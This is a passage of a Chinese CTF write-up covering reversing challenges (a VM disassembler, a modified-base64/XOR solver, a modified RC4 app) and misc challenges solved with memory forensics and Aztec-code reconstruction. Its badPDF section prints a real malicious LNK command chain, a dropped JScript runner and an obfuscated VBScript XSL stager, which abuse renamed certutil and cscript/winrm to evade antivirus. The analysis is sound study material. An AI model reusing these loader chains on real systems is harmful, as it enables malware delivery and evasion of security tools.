class="number">4</span>, <span class="string">&quot;mov r2, 0x&#123;3:0&gt;2X&#125;&#123;2:0&gt;2X&#125;&#123;1:0&gt;2X&#125;&#123;0:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">0xCB</span>: [<span class="number">5</span>, <span class="number">4</span>, <span class="string">&quot;mov r3, 0x&#123;3:0&gt;2X&#125;&#123;2:0&gt;2X&#125;&#123;1:0&gt;2X&#125;&#123;0:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">0xCC</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r1, input[r3]&quot;</span>],</span><br><span class="line">         <span class="number">0xCD</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;mov r2, input[r3]&quot;</span>],</span><br><span class="line">         <span class="number">0xCE</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;xor r1, r2&quot;</span>],</span><br><span class="line">         <span class="number">0xCF</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;xor r2, r1&quot;</span>],</span><br><span class="line">         <span class="number">0xD0</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;cmp r1, data[r3]&quot;</span>], <span class="comment"># a==b:1    a&gt;b:2    a&lt;b:0</span></span><br><span class="line">         <span class="number">0xD1</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;cmp r2, data[r3]&quot;</span>],</span><br><span class="line">         <span class="number">0xD2</span>: [<span class="number">5</span>, <span class="number">4</span>, <span class="string">&quot;cmp r3, 0x&#123;3:0&gt;2X&#125;&#123;2:0&gt;2X&#125;&#123;1:0&gt;2X&#125;&#123;0:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">         <span class="number">0xD3</span>: [<span class="number">2</span>, <span class="number">1</span>, <span class="string">&quot;jz &#123;0:0&gt;4&#125;&quot;</span>], <span class="comment"># == 1</span></span><br><span class="line">         <span class="number">0xD4</span>: [<span class="number">2</span>, <span class="number">1</span>, <span class="string">&quot;jnz &#123;0:0&gt;4&#125;&quot;</span>], <span class="comment"># == 0</span></span><br><span class="line">         <span class="number">0xFE</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;; wrong&quot;</span>],</span><br><span class="line">         <span class="number">0xFF</span>: [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;; right&quot;</span>]&#125;</span><br><span class="line">opcode = [<span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0xEE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0xD1</span>, <span class="number">0xD3</span>, <span class="number">0x01</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD4</span>, <span class="number">0xEC</span>, <span class="number">0xFF</span>]</span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line">res = [<span class="string">&quot;Addr    Code\n&quot;</span>]</span><br><span class="line">addrfmt = <span class="string">&quot;&#123;0:0&gt;4&#125;    &quot;</span></span><br><span class="line"><span class="keyword">while</span> pc &lt; <span class="built_in">len</span>(opcode):</span><br><span class="line">    i = pc</span><br><span class="line">    pc += ins_set[opcode[i]][<span class="number">0</span>]</span><br><span class="line">    res.append(addrfmt.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> opcode[i] <span class="keyword">not</span> <span class="keyword">in</span> ins_set.keys():</span><br><span class="line">        print(<span class="string">&quot;[-] UknOpcode 0x&#123;0:X&#125; in addr 0x&#123;1:0&gt;8X&#125;.\n&quot;</span>.<span class="built_in">format</span>(opcode[i],i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i] <span class="keyword">in</span> [<span class="number">0xD3</span>, <span class="number">0xD4</span>]:</span><br><span class="line">        jmpdelta = opcode[i+<span class="number">1</span>] <span class="keyword">if</span> opcode[i+<span class="number">1</span>] &amp; <span class="number">0x80</span> == <span class="number">0</span> <span class="keyword">else</span> opcode[i+<span class="number">1</span>] - <span class="number">256</span></span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(pc + jmpdelta)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        args=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ins_set[opcode[i]][<span class="number">1</span>]):</span><br><span class="line">            args.append(opcode[i+<span class="number">1</span>+j])</span><br><span class="line">        res.append(ins_set[opcode[i]][<span class="number">2</span>].<span class="built_in">format</span>(*args)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(res)</span><br></pre></td></tr></table></figure><p>拿到res.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Addr    Code</span><br><span class="line">0000    mov r2, 0x00000000</span><br><span class="line">0005    mov r3, 0x00000000</span><br><span class="line">0010    mov r1, input[r3]</span><br><span class="line">0011    xor r2, r1</span><br><span class="line">0012    mov r1, 0x000000EE</span><br><span class="line">0017    xor r2, r1</span><br><span class="line">0018    cmp r2, data[r3]</span><br><span class="line">0019    jz 0022</span><br><span class="line">0021    ; wrong</span><br><span class="line">0022    inc r3</span><br><span class="line">0023    cmp r3, 0x00000039</span><br><span class="line">0028    jnz 0010</span><br><span class="line">0030    ; right</span><br></pre></td></tr></table></figure><p>就是一个很简单的循环处理+比对，需要注意的是r2是累计值（被坑完出来的人5555，血泪经历）</p><p>连前面的base64魔改一起写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0xBE</span>, <span class="number">0x36</span>, <span class="number">0xAC</span>, <span class="number">0x27</span>, <span class="number">0x99</span>, <span class="number">0x4F</span>, <span class="number">0xDE</span>, <span class="number">0x44</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0xDA</span>, <span class="number">0x0B</span>, <span class="number">0xB5</span>, <span class="number">0x17</span>, <span class="number">0xB8</span>, <span class="number">0x68</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x9C</span>, <span class="number">0x4A</span>, <span class="number">0xE1</span>, <span class="number">0x43</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0x8A</span>, <span class="number">0x3B</span>, <span class="number">0x88</span>, <span class="number">0x5B</span>, <span class="number">0xE5</span>, <span class="number">0x54</span>, <span class="number">0xFF</span>, <span class="number">0x68</span>, <span class="number">0xD5</span>, <span class="number">0x67</span>, <span class="number">0xD4</span>, <span class="number">0x06</span>, <span class="number">0xAD</span>, <span class="number">0x0B</span>, <span class="number">0xD8</span>, <span class="number">0x50</span>, <span class="number">0xF9</span>, <span class="number">0x58</span>, <span class="number">0xE0</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x4A</span>, <span class="number">0xFD</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0x52</span>, <span class="number">0xFB</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x0D</span>, <span class="number">0xE3</span>]</span><br><span class="line">data = [<span class="number">0</span>] + data</span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    tmp.append(data[i<span class="number">-1</span>] ^ <span class="number">0xEE</span> ^ data[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">arr = [<span class="number">0xA</span>, <span class="number">0xB</span>, <span class="number">0xC</span>, <span class="number">0xD</span>]</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(tmp[pos] ^ arr[pos%<span class="number">4</span>])</span><br><span class="line">    pos += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line">print(base64.b64decode(flag.encode()))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220123180848773.png"></p><p>flag：<strong>2586dc76-98d5-44e2-ad58-d06e6559d82a</strong></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>这题ollvm太阴间了啊啊啊！！！</p><p>惯例去完花以后，可以看到在主函数由很明显的几个函数段</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124233120068.png"></p><p>一个xor运算</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124233208440.png"></p><p>一个n复杂运算</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234946031.png"></p><p>又一个xor运算</p><p>还有不知道在哪但绝对是最后一步的base64换表（在最后有比较，比较以后直接接success）</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124233455356.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124233505002.png"></p><p>实在看不动了直接动态调试+找规律</p><p>用的几组测试数据↓</p><p><img src="/p/wpFor-2022HWSTrial/image-20220125230150063.png"></p><p>关于xor的识别，这实际上是一种常用的混淆手法（在之前某一道题里磨砺出来的），顺便总结一下 （加上在这道题里学会的|），一般来说找几组数据验证一下就能猜出来的：</p><ul><li>(~x|y)-(x|~y) &#x3D;&#x3D; <strong>x - y</strong></li><li>(~x&amp;y)-(x&amp;~y) &#x3D;&#x3D; <strong>x - y</strong></li><li>(~x&amp;y)+(x&amp;~y) &#x3D;&#x3D; <strong>x ^ y</strong></li><li>(~x&amp;y)|(x&amp;~y) &#x3D;&#x3D; <strong>x ^ y</strong></li><li>x|y+x|y-x-y &#x3D;&#x3D; <strong>x ^ y</strong></li><li>~(~y|~x)|(y^x) &#x3D;&#x3D; <strong>x | y</strong></li></ul><p>在这里下断点可以调出第一部分的xor</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234018420.png"></p><p>看汇编可以知道xor的数据在var_18，8次循环，每次循环会改变4个字节，也就是说4字节为一组</p><p>往上翻到算出var_18的地方，发现是由每组同一位置共八字节的相互xor得到的，看附近的汇编代码即可</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234146931.png"></p><p>于是有第一个逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    arr[i%<span class="number">4</span>] ^= s[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i] ^= arr[i%<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>第二个逻辑在下一个xor下断点</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234348460.png"></p><p>通过动态调试可以看到是从3开始每次1字节1字节改变，同样3个一组，且如果输入为全相同（比如<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>）的时候更明显，这种输入不会受到第一个xor的影响（偶数个相同的异或起来为0）</p><p>xor的数据在var_31 var_32 var_33，同样可以看汇编往上追溯</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234626495.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234637112.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124234644250.png"></p><p>反编译可以看到就是那个巨复杂的运算，由真值表化简可以得到第二段逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">len</span>(s), <span class="number">3</span>):</span><br><span class="line">    tmp = [s[i<span class="number">-3</span>]&gt;&gt;<span class="number">2</span>, ((s[i<span class="number">-2</span>]&gt;&gt;<span class="number">4</span>)|(~(~s[i<span class="number">-3</span>]|<span class="number">0xfc</span>)&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span>, ((s[i<span class="number">-1</span>]&gt;&gt;<span class="number">6</span>)|((s[i<span class="number">-2</span>]&amp;(s[i<span class="number">-2</span>]^<span class="number">0xF0</span>))&lt;&lt;<span class="number">2</span>))&amp;<span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(s)):</span><br><span class="line">        s[j] ^= tmp[j%<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>最后逆向写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;Fi9X/fxX6Q6JBfUfBM1V/y6V6PcPjMaQLl9IuttFuH68&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;aJW31v1YF9nucbsFYGp2/XtrIO8tUi7oBX1CYmVVuGZ0&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;BGpvCSXOIOUgBOp0Uofm1PZh1Msa4YVaS81UmWHchtr&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;1Of0LdCt6iVW/M6x1dc0LOPz6lYp/t9e1Of0LdCt6iQ1&quot;</span></span><br><span class="line"></span><br><span class="line">myTable  = <span class="string">&quot;QVEJAfHmUYjBac+u8Ph5n9Od16FrICL/X0GvtM4qk7T2z3wNSsyoebilxWKgZpRD&quot;</span></span><br><span class="line">b64table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">s = <span class="built_in">list</span>(base64.b64decode(s.translate(<span class="built_in">str</span>.maketrans(myTable,b64table)).encode()))</span><br><span class="line"><span class="comment"># print(bytes(s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = list(&quot;qwertyuiopasdfghjklzxcvbnm123456&quot;)</span></span><br><span class="line"><span class="comment"># s = &quot;abcdefghijklmnopqrstuvwxyz012345&quot;</span></span><br><span class="line"><span class="comment"># s = list(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># arr = [0 for _ in range(4)]</span></span><br><span class="line"><span class="comment"># for i in range(len(s)):</span></span><br><span class="line"><span class="comment">#     arr[i%4] ^= s[i]</span></span><br><span class="line"><span class="comment"># for i in range(len(s)):</span></span><br><span class="line"><span class="comment">#     s[i] ^= arr[i%4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(3, len(s), 3):</span></span><br><span class="line"><span class="comment">#     tmp = [s[i-3]&gt;&gt;2, ((s[i-2]&gt;&gt;4)|(~(~s[i-3]|0xfc)&lt;&lt;4))&amp;0xff, ((s[i-1]&gt;&gt;6)|((s[i-2]&amp;(s[i-2]^0xF0))&lt;&lt;2))&amp;0xff]</span></span><br><span class="line"><span class="comment">#     for j in range(i, len(s)):</span></span><br><span class="line"><span class="comment">#         s[j] ^= tmp[j%3]</span></span><br><span class="line"><span class="comment"># print(bytes(s))</span></span><br><span class="line"></span><br><span class="line">s2 = s.copy()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">len</span>(s), <span class="number">3</span>):</span><br><span class="line">    tmp = [s[i<span class="number">-3</span>]&gt;&gt;<span class="number">2</span>, ((s[i<span class="number">-2</span>]&gt;&gt;<span class="number">4</span>)|(~(~s[i<span class="number">-3</span>]|<span class="number">0xfc</span>)&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span>, ((s[i<span class="number">-1</span>]&gt;&gt;<span class="number">6</span>)|((s[i<span class="number">-2</span>]&amp;(s[i<span class="number">-2</span>]^<span class="number">0xF0</span>))&lt;&lt;<span class="number">2</span>))&amp;<span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(s)):</span><br><span class="line">        s2[j] ^= tmp[j%<span class="number">3</span>]</span><br><span class="line">s2 = s2[:<span class="number">-1</span>] <span class="comment"># 最后多了一位填充</span></span><br><span class="line"><span class="comment"># print(bytes(s2))</span></span><br><span class="line"></span><br><span class="line">arr = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    arr[i%<span class="number">4</span>] ^= s2[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    s2[i] ^= arr[i%<span class="number">4</span>]</span><br><span class="line">print(<span class="built_in">bytes</span>(s2))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220124234840708.png"></p><p>flag：<strong>fce5e3dfc6db4f808ccaa6fcffecf583</strong></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="badPDF"><a href="#badPDF" class="headerlink" title="badPDF"></a>badPDF</h2><p>拿到文件就直接打开了orz，发现找不到js，意识到有payload嵌入。查看target</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124222953794.png"></p><p>这里显示不全，直接用十六进制阅读器打开可以看到target的一些关键字，定位到这里，把可见字符提取出来</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124223125351.png"></p><p><code>Windows\System32\cmd.exe /c copy &quot;20200308-sitrep-48-covid-19.pdf.lnk&quot; %tmp%\\g4ZokyumBB2gDn.tmp /y&amp;for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe &quot;TVNDRgAAAA&quot; %tmp%\\g4ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</code></p><p>在阅读代码的过程中搜索关键字(*ertu*.exe)找到了原病毒：<a href="https://www.freebuf.com/articles/network/241414.html">https://www.freebuf.com/articles/network/241414.html</a></p><p>有一个很有趣的地方就是，这里明明就是复制一次（把certutil.exe复制过去），为什么要用到for呢。就是通过(*ertu*.exe)这个正则匹配绕过安全检测，毕竟那个文件夹里肯定就只有一个exe是符合的，不会有误操作，而且可以避免杀软啥的对certutil.exe操作的检查（猜的）。</p><p><del>我在CTF题学cmd命令，捂脸</del></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124223701986.png"></p><p>第一层是一样的，所以直接跟着他代码做，直到拿到<code>9sOXN6Ltf0afe7.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">e7926b8de13327f8e703624e.Run (<span class="string">&quot;cmd /c mkdir %tmp%\\cscript.exe&amp;for /r C:\\Windows\\System32\\ %m in (cscr*.exe) do copy %m %tmp%\\cscript.exe\\msproof.exe /y&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\cscript.exe\\WsmPty.xsl&amp;%tmp%\\cscript.exe\\msproof.exe //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty&amp;del \&quot;%tmp%\\cscript.exe\\WsmPty.xsl\&quot; /f /q&amp;\&quot;%tmp%\\20200308-sitrep-48-covid-19.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以看到又是一层系统调用，不过这层就没什么东西了，就是让他能成功调用最后删除中间文件的过程。</p><p>做到<code>move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\cscript.exe\\WsmPty.xsl</code>可以知道，上一步解压出来的<code>cSi1r0uywDNvDu.tmp</code>实际上也是一个代码，打开可以看到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:ms</span>=<span class="string">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">&quot;placeholder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> rBOH7OLTCVxzkH=HrtvBsRh3gNUbe(&quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c&quot;):execute(rBOH7OLTCVxzkH):function HrtvBsRh3gNUbe(bhhz6HalbOkrki):for rBOH7OLTCVxzkH=1 to len(bhhz6HalbOkrki)step 2:HrtvBsRh3gNUbe=HrtvBsRh3gNUbe&amp;chr(asc(chr(&quot;&amp;h&quot;&amp;mid(bhhz6HalbOkrki,rBOH7OLTCVxzkH,2)))xor 1):next:end function:</span><br><span class="line"> ]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>嵌入了一段VBscript的代码，速成VBscript可以发现这实际上就是个unhex+xor 1的过程</p><p>VBscript的关键点在：</p><ul><li>“aaa” &amp; “bbb” &#x3D;&#x3D; “aaabbb”，这里&amp;是连接符的意思，相当于python里字符串之间的+</li><li>“&amp;h41”实际上就是python里的”\x41”，所以这里chr(“&amp;h”&amp;mid(bhhz6HalbOkrki,rBOH7OLTCVxzkH,2))是取两位然后unhex（内置函数的作用自行搜索）</li><li>VB里面异或就写成xor是我没想到的（逃</li></ul><p>所以写exp有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    flag += <span class="built_in">chr</span>(x ^ <span class="number">1</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022HWSTrial/image-20220123133730571.png"></p><p>flag：<strong>e27d3de27d3de27d3d7d3de27dde27d3</strong></p><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>本来以为raw是拼图的线索，一番内存取证发现并没有什么线索。</p><p>后来想到如果是python程序切出来的，那肯定出来的时间是有先后的吧 <del>（我就不信有人ps手切）</del> ，所以直接日期排序走起。</p><p>电脑屏幕太小了显示不了16张一行，稍微微调了一下（每行删掉第一张</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124214617674.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124214649437.png"></p><p>可以看到password是3e8f092d4d7b80ce338d6e238efb01。</p><p>能用到password的地方一般都是压缩包，于是去filescan一下把文件列表导出来，grep看有没有奇怪的压缩包。</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124220232147.png"></p><p>发现有一个csgo.zip.zip（fps玩家狂喜），感觉是奇怪的包，dump下来。</p><p><code>volatility -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./ -u</code></p><p>用password解密发现可行，解出来一张打不开的<code>csgo.png</code>图片，png解包经典foremost</p><p><code>foremost csgo.png</code>解出来两张图</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124221520952.png"></p><p>第一张图不太像二维码（四周补上的话data区缺太多），按着这个思路搜索其他的二维码发现一种特征在中间的Aztec code。</p><p>（赛后听凌邪师傅说枪的“阿兹特克”就是指这个Aztec，人傻了.jpg）</p><p>于是按照格式用photoshop拼了一下 <del>（做工极度粗糙，管他的能扫就行）</del> </p><p><img src="/p/wpFor-2022HWSTrial/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220123163205.png"></p><p>找到了（好像是唯一的）在线解码器：<a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec#">https://products.aspose.app/barcode/zh-hans/recognize/aztec#</a></p><p><img src="/p/wpFor-2022HWSTrial/image-20220123163515394.png"></p><p>发现解码成功！</p><p>flag：<strong>fbab8380-a642-48aa-89b1-8e251f826b12</strong></p><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>看MainActivity没看出什么，发现有调库就先去看库了。</p><p>实在没找到能入手的地方，于是去翻字符串，居然看到了</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124160814551.png"></p><p>眉头一皱，发现并不简单.jpg</p><p>然后直接去找这个字符串的交叉引用，果然看到了一个check函数</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124160914172.png"></p><p>ooo000粗略的看起来是一个base64，sub_4AE8有一点混淆，通过调用的分析和一些典型操作（比如初始化s盒、xor，那几个图里已命名的函数）能大概看出来是个魔改rc4，<strong>从xor操作看出除了正常的rc4异或以外还异或了当前的序号</strong>。比较的v17是已知数组off_17180。</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124162345164-16431747493751.png" alt="image-20220124162345164"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124162408263.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124162420829-16431747580992.png" alt="image-20220124162420829"></p><p>在genKey里，密钥通过一个倒着的表和一些计算得出</p><p><img src="/p/wpFor-2022HWSTrial/image-20220124162553728.png"></p><p><img src="/p/wpFor-2022HWSTrial/image-20220124162604899.png"></p><p>所以可以根据他的方法将密钥算出来，同时在rc4的结果上遍历xor序号就能拿到第一部分的结果</p><p><img 